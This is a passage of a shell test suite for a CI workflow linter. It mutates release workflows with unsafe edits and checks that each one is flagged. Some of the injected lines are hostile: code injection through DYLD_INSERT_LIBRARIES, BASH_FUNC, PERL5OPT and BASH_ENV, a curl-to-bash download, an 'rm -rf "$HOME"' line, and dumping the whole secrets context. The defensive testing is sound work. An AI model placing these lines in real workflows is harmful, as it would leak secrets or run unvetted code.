		'Cache bun install cache: takes inputs other than path, key and lookup-only'
	action_case 'the bun install cache discard under sh (#1047 review 2)' bun-setup \
		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: sh\n      run: rm -rf ~/.bun/install/cache' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'the Go caches looked up on another path (#1047 review 2)' go-setup \
		$'          ${{ steps.go-cache-dirs.outputs.build }}\n        key: go-${{ runner.os }}-${{ runner.arch }}-${{ steps.go-cache-dirs.outputs.image }}-${{ steps.go-cache-dirs.outputs.version }}-${{ hashFiles(\'sidecar/go.sum\') }}\n        lookup-only: true\n' \
		$'          /tmp/other\n        key: go-${{ runner.os }}-${{ runner.arch }}-${{ steps.go-cache-dirs.outputs.image }}-${{ steps.go-cache-dirs.outputs.version }}-${{ hashFiles(\'sidecar/go.sum\') }}\n        lookup-only: true\n' \
		'Go module and build cache: not gated by a lookup-only actions/cache/restore'
	action_case 'GOCACHE gone from the discard env while rm still names it (#1047 review 2)' go-setup \
		$'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n' '' \
		'Go module and build cache: a restore that is not an exact key match is not discarded'
	expect_caught 'HOME set for the whole job, which moves the discard (#1047 review 2)' mutable "$WORKFLOWS/test.yml" \
		$'\n  test:\n' $'\n  test:\n    env:\n      HOME: /nonexistent\n' \
		'test: step (via ./.github/actions/bun-setup) Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'GOFLAGS on the Go discard, read by an extra rm line (#1047 review 3)' go-setup \
		$'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n      run: |\n' $'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n        GOFLAGS: -n\n      run: |\n        rm -rf -- "$GOFLAGS"\n' \
		'Go module and build cache: a restore that is not an exact key match is not discarded'
	action_case 'BASH_ENV on the bun discard, read by an extra rm line (#1047 review 3)' bun-setup \
		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      env:\n        BASH_ENV: ./x.sh\n      run: |\n        rm -rf "$BASH_ENV"\n        rm -rf ~/.bun/install/cache' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'HOME on the bun discard, read by an extra rm line (#1047 review 3)' bun-setup \
		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      env:\n        HOME: /nonexistent\n      run: |\n        rm -rf "$HOME"\n        rm -rf ~/.bun/install/cache' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	expect_caught 'GOFLAGS on the step that uses go-setup (#1047 review 3)' mutable "$WORKFLOWS/test.yml" \
		$'      - uses: ./.github/actions/go-setup\n' $'      - uses: ./.github/actions/go-setup\n        env:\n          GOFLAGS: -n\n' \
		'the job, workflow or enclosing step sets GOFLAGS'
	expect_caught 'HOME on the step that uses bun-setup (#1047 review 3)' mutable "$WORKFLOWS/test.yml" \
		$'      - uses: ./.github/actions/bun-setup\n' $'      - uses: ./.github/actions/bun-setup\n        env:\n          HOME: /nonexistent\n' \
		'the job, workflow or enclosing step sets HOME'
	expect_caught 'an exported bash function for the whole job (#1047 review 3)' mutable "$WORKFLOWS/test.yml" \
		$'\n  test:\n' $'\n  test:\n    env:\n      BASH_FUNC_rm%%: "() { :; }"\n' \
		'the job, workflow or enclosing step sets BASH_FUNC_rm%%'
	expect_caught 'XDG_CONFIG_HOME for the whole workflow, where go reads its env file (#1047 review 3)' mutable "$WORKFLOWS/test.yml" \
		$'\njobs:\n' $'\nenv:\n  XDG_CONFIG_HOME: /tmp/x\n\njobs:\n' \
		'the job, workflow or enclosing step sets XDG_CONFIG_HOME'
	expect_caught 'GOFLAGS written to GITHUB_ENV before go-setup (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
		$'      - uses: ./.github/actions/go-setup\n' $'      - run: echo "GOFLAGS=-n" >> "$GITHUB_ENV"\n      - uses: ./.github/actions/go-setup\n' \
		'GOFLAGS (written to GITHUB_ENV by an earlier step)'
	expect_caught 'a directory put on PATH before bun-setup (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
		$'      - uses: ./.github/actions/bun-setup\n' $'      - run: echo "$PWD/tools" >> "$GITHUB_PATH"\n      - uses: ./.github/actions/bun-setup\n' \
		'GITHUB_PATH (written by an earlier step)'
	expect_caught 'GITHUB_ENV written from a file before bun-setup (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
		$'      - uses: ./.github/actions/bun-setup\n' $'      - run: cat env.txt >> "$GITHUB_ENV"\n      - uses: ./.github/actions/bun-setup\n' \
		'GITHUB_ENV written in a form this rule cannot read'
	expect_caught 'the job env as one expression (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
		$'\n  test:\n' $'\n  test:\n    env: ${{ fromJSON(vars.TEST_ENV) }}\n' \
		'an env this rule cannot read as a mapping'
	expect_caught 'two GITHUB_ENV writes on one line, one of them a steering name (#1047 review 4)' mutable "$WORKFLOWS/test.yml" \
		$'      - uses: ./.github/actions/bun-setup\n' $'      - run: echo "GOFLAGS=-n" >> "$GITHUB_ENV" && echo "FOO=1" >> "$GITHUB_ENV"\n      - uses: ./.github/actions/bun-setup\n' \
		'GOFLAGS (written to GITHUB_ENV by an earlier step)'
	# On Windows Go places its caches under these, as HOME on the others.
	expect_caught 'USERPROFILE for the Windows Go job, which moves the module cache (#1047 review 5)' mutable "$WORKFLOWS/test.yml" \
		$'  sidecar-test-windows:\n' $'  sidecar-test-windows:\n    env:\n      USERPROFILE: /tmp/elsewhere\n' \
		'the job, workflow or enclosing step sets USERPROFILE'
	expect_caught 'LOCALAPPDATA on the step that uses go-setup (#1047 review 5)' mutable "$WORKFLOWS/test.yml" \
		$'      - uses: ./.github/actions/go-setup\n' $'      - uses: ./.github/actions/go-setup\n        env:\n          LOCALAPPDATA: /tmp/x\n' \
		'the job, workflow or enclosing step sets LOCALAPPDATA'
	expect_caught 'APPDATA for the whole workflow (#1047 review 5)' mutable "$WORKFLOWS/test.yml" \
		$'\njobs:\n' $'\nenv:\n  APPDATA: /tmp/x\n\njobs:\n' \
		'the job, workflow or enclosing step sets APPDATA'
	expect_caught 'Bun restored from the Actions cache by the toast job (#1047)' mutable "$WORKFLOWS/test.yml" \
		$'          no-cache: true\n' '' \
		'toast-windows: step oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6: setup-bun without no-cache: true'
}
# shellcheck disable=SC2016 # JavaScript source, not shell.
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
// test.yml has no top-level env since #1047, so one is added in front of
// jobs:, and a missing anchor writes nothing, which fails the check below.
const s = await Bun.file(process.env.FROM).text();
if (s.split("\njobs:\n").length !== 2) process.exit(2);
await Bun.write(process.env.TO, s.replace("\njobs:\n", "\nenv:\n  ALL: ${{ toJSON(secrets) }}\n\njobs:\n"));
' && ok_written=1 || ok_written=0
if [ "$ok_written" = 1 ] && [ -n "$(check authority "$copy")" ]; then
	ok "reports: a workflow that serialises the whole secrets context holds authority"
else
	no "reports: a workflow that serialises the whole secrets context holds authority"
fi
# shellcheck disable=SC2016 # JavaScript source, not shell.
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
// test.yml has no top-level env since #1047, so one is added in front of
// jobs:, and a missing anchor writes nothing, which fails the check below.
const s = await Bun.file(process.env.FROM).text();
if (s.split("\njobs:\n").length !== 2) process.exit(2);
await Bun.write(process.env.TO, s.replace("\njobs:\n", "\nenv:\n  K: ${{ format(\x27{0}\x27, SECRETS.SOME_KEY) }}\n\njobs:\n"));
' && ok_written=1 || ok_written=0
if [ "$ok_written" = 1 ] && [ -n "$(check authority "$copy")" ]; then
	ok "reports: a secret read inside a format string, in upper case"
else
	no "reports: a secret read inside a format string, in upper case"
fi
expect_caught 'a local composite action that installs dependencies, in the job that publishes with id-token' narrow "$WORKFLOWS/sidecar-release.yml" \
	'      - name: Ensure npm supports Trusted Publishing' $'      - uses: ./.github/actions/bun-setup\n      - name: Ensure npm supports Trusted Publishing'
expect_caught 'a local action that does not exist' pinned "$WORKFLOWS/release.yml" \
	'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' '      - uses: ./.github/actions/nope
      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0'
expect_caught 'a major tag in a pull_request_target workflow' pinned "$WORKFLOWS/labeler.yml" \
	'uses: actions/labeler@bf12e9b00b37c5c0ca2b87b79b2daf7891dbda13' 'uses: actions/labeler@v5'
expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-release.yml" \
	'uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'uses: actions/checkout@3d3c42e'
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'npm@latest back in a job holding id-token' mutable "$WORKFLOWS/release-exec.yml" \
		'npm install -g --offline --ignore-scripts "$npm_tgz"' 'npm install -g npm@latest'
	expect_caught 'a floating Bun reached through env indirection' mutable "$WORKFLOWS/release-exec.yml" \
		'  BUN_VERSION: "1.4.2"' '  BUN_VERSION: latest'
	expect_caught 'a floating Bun in the job that can tag a release' mutable "$WORKFLOWS/release.yml" \
		'bun-version: "1.4.2"' 'bun-version: latest'
	expect_caught 'the binfmt image back to its :latest default' mutable "$WORKFLOWS/release-exec.yml" \
		$'          image: ${{ env.BINFMT_IMAGE }}\n' ''
	expect_caught 'the privileged binfmt image restored from the Actions cache' mutable "$WORKFLOWS/release-exec.yml" \
		'          cache-image: false' '          cache-image: true'
	expect_caught 'BuildKit by tag instead of digest' mutable "$WORKFLOWS/release-exec.yml" \
		'BUILDKIT_IMAGE: moby/buildkit:v0.33.1@sha256:' 'BUILDKIT_IMAGE: moby/buildkit:buildx-stable-1 #'
	expect_caught 'BuildKit back to its default image' mutable "$WORKFLOWS/release-exec.yml" \
		$'        with:\n          driver-opts: image=${{ env.BUILDKIT_IMAGE }}\n' ''
	expect_caught 'the SBOM generator back to its default tag on the build that ships (#680)' mutable "$WORKFLOWS/release-exec.yml" \
		'          sbom: generator=${{ env.SBOM_GENERATOR }}' '          sbom: true' \
		'SBOM generator image is not pinned by digest'
	expect_caught 'the SBOM generator back to its default tag on the dry-run twin (#680)' mutable "$WORKFLOWS/release-exec.yml" \
		$'          sbom: generator=${{ env.SBOM_GENERATOR }}\n          outputs: type=oci' $'          sbom: true\n          outputs: type=oci' \
		'SBOM generator image is not pinned by digest'
	expect_caught 'the SBOM generator pin loosened to its tag (#680)' mutable "$WORKFLOWS/release-exec.yml" \
		'  SBOM_GENERATOR: docker/buildkit-syft-scanner:1.12.0@sha256:' '  SBOM_GENERATOR: docker/buildkit-syft-scanner:stable-1 #' \
		'SBOM generator image is not pinned by digest ("docker/buildkit-syft-scanner:stable-1")'
	expect_caught 'an SBOM requested through attests with no generator (#680)' mutable "$WORKFLOWS/release-exec.yml" \
		'          sbom: generator=${{ env.SBOM_GENERATOR }}' '          attests: type=sbom' \
		'SBOM generator image is not pinned by digest ("default stable-1")'
	expect_caught 'a global npm install with no version' mutable "$WORKFLOWS/sidecar-release.yml" \
		'npm install -g --offline --ignore-scripts "$npm_tgz"' 'npm install -g npm'
	expect_caught 'a global npm install of a range' mutable "$WORKFLOWS/sidecar-release.yml" \
		'npm install -g --offline --ignore-scripts "$npm_tgz"' 'npm i -g npm@^12'
	expect_caught 'the npm pin itself loosened to a major' mutable "$WORKFLOWS/sidecar-release.yml" \
		'  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "12"'
	expect_caught 'a Bun range in the job that can tag a release' mutable "$WORKFLOWS/release.yml" \
		'bun-version: "1.4.2"' 'bun-version: "1.x"'
	expect_caught 'a download piped into a shell' mutable "$WORKFLOWS/release.yml" \
		'      - name: Compute new version' $'      - run: curl -fsSL https://bun.sh/install | bash\n      - name: Compute new version'
	expect_caught 'Bun taken from a version file' mutable "$WORKFLOWS/release.yml" \
		'bun-version: "1.4.2"' 'bun-version-file: package.json'
	# go-version-file is accepted only while go.mod names an exact version.
	mkdir -p "${WORK}/gomod/sidecar"
	sed 's/^go \([0-9]*\.[0-9]*\)\.[0-9]*$/go \1/' "${HERE}/../../sidecar/go.mod" >"${WORK}/gomod/sidecar/go.mod"
	if grep -qE '^go [0-9]+\.[0-9]+$' "${WORK}/gomod/sidecar/go.mod" &&
		[ -n "$(REPO_DIR="${WORK}/gomod" check mutable "$WORKFLOWS/sidecar-release.yml")" ]; then
		ok "reports: a two-part go directive behind go-version-file"
	else
		no "reports: a two-part go directive behind go-version-file"
	fi
	expect_caught 'Bun restored from the Actions cache' mutable "$WORKFLOWS/release.yml" \
		$'          no-cache: true\n' ''
	expect_caught 'the npm cache of setup-node left on in the job holding id-token (#1046 review)' mutable "$WORKFLOWS/sidecar-release.yml" \
		$'          package-manager-cache: false\n' '' \
		'setup-node without package-manager-cache: false'
	expect_caught 'the npm cache of setup-node left on in pack-brain (#1046 review)' mutable "$WORKFLOWS/release-exec.yml" \
		$'          package-manager-cache: false\n' '' \
		'setup-node without package-manager-cache: false'
	expect_caught 'setup-node asked for an npm cache by name (#1046 review)' mutable "$WORKFLOWS/sidecar-release.yml" \
		$'          package-manager-cache: false\n' $'          package-manager-cache: false\n          cache: npm\n' \
		'or with cache:'
	expect_caught 'Go modules and build output restored from the Actions cache' mutable "$WORKFLOWS/sidecar-release.yml" \
		$'          cache: false\n' ''
}
# #870: a job holding a signing secret builds nothing, installs nothing,
# runs no repository script and takes its input only by digest.
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	R870='in a job holding a signing secret'
	expect_caught 'go build in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          go build -o x .\n' \
		"sign-sidecar-darwin: builds or runs build tooling ${R870} (#870): go build"
	expect_caught 'make dmg-installer back in the installer signing job (#870)' narrow "$WORKFLOWS/installer-release.yml" \
		'          hdiutil create -volname "Install Jarvis" -srcfolder "$APP" -format UDZO -ov "$DMG"' '          make dmg-installer' \
		"sign-macos: builds or runs build tooling ${R870} (#870): make dmg-installer"
	expect_caught 'clang run through xcrun in the installer signing job (#870)' narrow "$WORKFLOWS/installer-release.yml" \
		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          xcrun --sdk macosx clang -o x x.c' \
		"sign-macos: runs xcrun other than notarytool or stapler, which can run build tooling, ${R870} (#870): xcrun --sdk macosx clang"
	expect_caught 'swiftc in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'            app="${RUNNER_TEMP}/work/${leg}/Jarvis.app"\n            if' $'            app="${RUNNER_TEMP}/work/${leg}/Jarvis.app"\n            swiftc -O -o x helpers/ocr-helper.swift\n            if' \
		"sign-sidecar-darwin: builds or runs build tooling ${R870} (#870): swiftc"
	expect_caught 'a brew install in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          brew install coreutils\n' \
		"sign-sidecar-darwin: installs packages ${R870} (#870): brew install coreutils"
	expect_caught 'a repository script in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          packaging/macos/make-icns.sh\n' \
		"sign-sidecar-darwin: runs a repository script ${R870} (#870): packaging/macos/make-icns.sh"
	expect_caught 'shell text in the installer signing job (#870)' narrow "$WORKFLOWS/installer-release.yml" \
		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          bash -c "$X"' \
		"sign-macos: runs shell text or sources a file ${R870}"
	expect_caught 'setup-go in the installer signing job (#870)' narrow "$WORKFLOWS/installer-release.yml" \
		$'      - name: Verify the installer app\n' $'      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:\n          cache: false\n      - name: Verify the installer app\n' \
		"sign-macos: uses actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e ${R870}"
	expect_caught 'a local action in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Unpack the bundles\n' $'      - uses: ./.github/actions/bun-setup\n      - name: Unpack the bundles\n' \
		"sign-sidecar-darwin: uses ./.github/actions/bun-setup ${R870}"
	expect_caught 'cgo switched on in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      signed: ${{ steps.applesign.outputs.ready }}\n    steps:\n      # For packaging/macos/entitlements.plist.' $'      signed: ${{ steps.applesign.outputs.ready }}\n    env:\n      CGO_ENABLED: "1"\n    steps:\n      # For packaging/macos/entitlements.plist.' \
		"sign-sidecar-darwin: job env sets CGO_ENABLED (a Go or C build) ${R870}"
	expect_caught 'the Apple secret back in the installer macOS build (#870)' narrow "$WORKFLOWS/installer-release.yml" \
		$'  build-macos:\n    needs: resolve\n' $'  build-macos:\n    env:\n      HAVE_APPLE_SIGNING: ${{ secrets.APPLE_CERT_P12 != \'\' }}\n    needs: resolve\n' \
		"build-macos: builds or runs build tooling ${R870} (#870): GOOS=darwin GOARCH=arm64 go build"
	expect_caught 'the Apple secret back in a sidecar darwin build leg (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'  build-sidecar-darwin-arm64:\n    needs: resolve\n' $'  build-sidecar-darwin-arm64:\n    env:\n      HAVE_APPLE_SIGNING: ${{ secrets.APPLE_CERT_P12 != \'\' }}\n    needs: resolve\n' \
		"build-sidecar-darwin-arm64: builds or runs build tooling ${R870} (#870): ../.github/scripts/build-sidecar.sh"
	expect_caught 'an Apple secret in the workflow env, reaching every build leg (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'env:\n  # No GO_VERSION' $'env:\n  APPLE_CERT_PASSWORD: ${{ secrets.APPLE_CERT_PASSWORD }}\n  # No GO_VERSION' \
		"build-sidecar-linux-x64: builds or runs build tooling ${R870} (#870): ../.github/scripts/build-sidecar.sh"
	expect_caught 'the macOS signer taking the unsigned app without its digest check (#870)' narrow "$WORKFLOWS/installer-release.yml" \
		'          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 256 -c -' '          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | cat' \
		'sign-macos: download "unsigned-installer-darwin" is not followed at once by a sha256sum -c'
	expect_caught 'the macOS signer checking a SHA-1 instead (#870)' narrow "$WORKFLOWS/installer-release.yml" \
		'          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 256 -c -' '          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 1 -c -' \
		'sign-macos: download "unsigned-installer-darwin" is not followed at once by a sha256sum -c'
	expect_caught 'the macOS signer excusing a failed digest check (#870)' narrow "$WORKFLOWS/installer-release.yml" \
		'          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 256 -c -' '          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 256 -c - || true' \
		'sign-macos: download "unsigned-installer-darwin" is checked with a failure excused'
	expect_caught 'a signing step run by node instead of bash (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Unpack the bundles\n        run: |\n' $'      - name: Unpack the bundles\n        shell: node {0}\n        run: |\n' \
		"sign-sidecar-darwin: step \"Unpack the bundles\" runs in shell: node {0} ${R870}"
	expect_caught 'BASH_ENV sourcing a file before a signing step (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'      - name: Unpack the installer app\n        run: |\n' $'      - name: Unpack the installer app\n        env:\n          BASH_ENV: x\n        run: |\n' \
		"sign-macos: step \"Unpack the installer app\" env sets BASH_ENV ${R870}"
	expect_caught 'the dynamic loader poisoned for later signing steps through GITHUB_ENV (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          echo "DYLD_INSERT_LIBRARIES=/tmp/x.dylib" >> "$GITHUB_ENV"\n' \
		"sign-sidecar-darwin: step \"Unpack the bundles\" writes GITHUB_ENV or GITHUB_PATH ${R870}"
	expect_caught 'an extensionless repository program in the signing job (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          sidecar/packaging/macos/sign-helper "$APP"' \
		"sign-macos: runs a program from a variable, a bundle or the checkout ${R870}"
	expect_caught 'the unsigned bundle binary run as a smoke test in the signing job (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'            app="${RUNNER_TEMP}/work/${leg}/Jarvis.app"\n            if' $'            app="${RUNNER_TEMP}/work/${leg}/Jarvis.app"\n            "${app}/Contents/MacOS/jarvis" --version\n            if' \
		"sign-sidecar-darwin: runs a program from a variable, a bundle or the checkout ${R870}"
	expect_caught 'the bundle opened in the signing job (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          open "$APP"' \
		"sign-macos: runs a program from a variable, a bundle or the checkout ${R870}"
	expect_caught 'an Apple secret handed to a workflow off the release path (#870 review)' narrow "$WORKFLOWS/test.yml" \
		'      - run: .github/scripts/release-exec.test.sh' $'      - run: .github/scripts/release-exec.test.sh\n        env:\n          K: ${{ secrets.ASC_API_KEY_P8 }}' \
		"runs a program from a variable, a bundle or the checkout ${R870}"
	expect_caught 'the macOS signer checking with shasum a digest it never held to 64 hex (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-macos reported no digest"; exit 1; }\n' '' \
		'is checked with shasum, which takes the algorithm from the digest length, without first holding every digest to 64 hex'
	expect_caught 'the sidecar macOS signer holding only one leg digest to 64 hex (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          [[ "$SHA_DARWIN_X64" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::no digest was reported for DARWIN_X64"; exit 1; }\n' '' \
		'is checked with shasum, which takes the algorithm from the digest length, without first holding every digest to 64 hex'
	expect_caught 'codesign pointed at another allocate helper (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}' $'          CODESIGN_ALLOCATE: x\n          APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}' \
		"sign-sidecar-darwin: step \"Sign and notarize (Developer ID)\" env sets CODESIGN_ALLOCATE ${R870}"
	expect_caught 'xcrun pointed at another developer directory in the script (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'          xcrun stapler staple "$APP"' $'          export DEVELOPER_DIR="${RUNNER_TEMP}/work"\n          xcrun stapler staple "$APP"' \
		"sign-macos: step \"Sign, notarize and staple\" sets DEVELOPER_DIR in its script, ${R870}"
	expect_caught 'bundle files run through find -exec in the signing job (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          find "${RUNNER_TEMP}/work" -name hook -exec {} \;\n' \
		"sign-sidecar-darwin: runs programs through find -exec, xargs or awk system() ${R870}"
	expect_caught 'a 64-hex hold excused with || : before shasum (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-macos reported no digest"; exit 1; }' '          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || :' \
		'is checked with shasum after a 64-hex hold whose failure does not stop the step'
	expect_caught 'an Apple secret by index syntax in a workflow off the release path (#870 review)' narrow "$WORKFLOWS/test.yml" \
		'      - run: .github/scripts/release-exec.test.sh' $'      - run: .github/scripts/release-exec.test.sh\n        env:\n          K: ${{ secrets[\'APPLE_CERT_P12\'] }}' \
		"runs a program from a variable, a bundle or the checkout ${R870}"
	expect_caught 'awk running a command after a semicolon in its program (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          ls | awk \'{ n++; system($0) }\'' \
		"sign-macos: runs programs through find -exec, xargs or awk system() ${R870}"
	expect_caught 'awk piping into a command (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          ls | awk \'{ print | "sh" }\'' \
		"sign-macos: runs programs through find -exec, xargs or awk system() ${R870}"
	expect_caught 'PERL5OPT loading code into shasum in a signing job (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          SHA_DARWIN_ARM64: ${{ needs.build-sidecar-darwin-arm64.outputs.sha256 }}\n' $'          PERL5OPT: -Mx\n          SHA_DARWIN_ARM64: ${{ needs.build-sidecar-darwin-arm64.outputs.sha256 }}\n' \
		"sign-sidecar-darwin: step \"Verify the bundles\" env sets PERL5OPT ${R870}"
	expect_caught 'a 64-hex hold whose brace only echoes the word exit (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-macos reported no digest"; exit 1; }' '          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo exit 1; }' \
		'is checked with shasum after a 64-hex hold whose failure does not stop the step'
	expect_caught 'a 64-hex hold whose exit sits behind true || (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-macos reported no digest"; exit 1; }' '          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { true || exit 1; }' \
		'is checked with shasum after a 64-hex hold whose failure does not stop the step'
}
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'secrets: inherit back on the sidecar call' narrow "$WORKFLOWS/release-exec.yml" \
		$'    secrets:\n      APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}\n' $'    secrets: inherit\n    x-was:\n      APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}\n'
	expect_caught 'a declared signing secret the caller does not pass (signing would silently skip)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      ASC_API_KEY_P8: ${{ secrets.ASC_API_KEY_P8 }}\n' ''
	expect_caught 'id-token back on a sidecar build leg' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      contents: read\n    outputs:\n      sha256: ${{ steps.digest.outputs.sha256 }}\n    # One leg.' $'      contents: read\n      id-token: write\n    outputs:\n      sha256: ${{ steps.digest.outputs.sha256 }}\n    # One leg.' \
		'a matrix job holding id-token'
	expect_caught 'the brain build back in the job that holds id-token' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: bun run prepublishOnly\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'a token left in .git/config by the release job' narrow "$WORKFLOWS/release-exec.yml" \
		$'          fetch-depth: 0\n          persist-credentials: false\n' $'          fetch-depth: 0\n'
	expect_caught 'no secrets passed to the sidecar call at all (signing would silently skip)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    secrets:\n      APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}\n      APPLE_CERT_PASSWORD: ${{ secrets.APPLE_CERT_PASSWORD }}\n      ASC_KEY_ID: ${{ secrets.ASC_KEY_ID }}\n      ASC_ISSUER_ID: ${{ secrets.ASC_ISSUER_ID }}\n      ASC_API_KEY_P8: ${{ secrets.ASC_API_KEY_P8 }}\n' ''
	expect_caught 'a checkout back in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - name: Verify the tarball' \
		'uses actions/checkout@'
	expect_caught 'a directory npm publish (runs lifecycle scripts)' narrow "$WORKFLOWS/release-exec.yml" \
		'npm publish "${RUNNER_TEMP}/brain-pack/${TARBALL}" --access public' 'npm publish --access public'
	# #1046: each npm call that acts on a package directory in the job
	# holding id-token, with --ignore-scripts dropped.
	expect_caught 'a platform npm version that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            npm version "${VERSION}" --no-git-tag-version --allow-same-version' \
		'publish-sidecar: runs npm version without --ignore-scripts'
	expect_caught 'the wrapper npm version that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'\n          npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts --workspaces=false\n' $'\n          npm version "${VERSION}" --no-git-tag-version --allow-same-version --workspaces=false\n' \
		'publish-sidecar: runs npm version without --ignore-scripts'
	expect_caught 'a platform directory npm publish that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public "${flags[@]}"' \
		'publish-sidecar: runs npm publish without --ignore-scripts'
	expect_caught 'the wrapper directory npm publish that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'\n          npm publish --access public --ignore-scripts "${flags[@]}"' $'\n          npm publish --access public "${flags[@]}"' \
		'publish-sidecar: runs npm publish without --ignore-scripts'
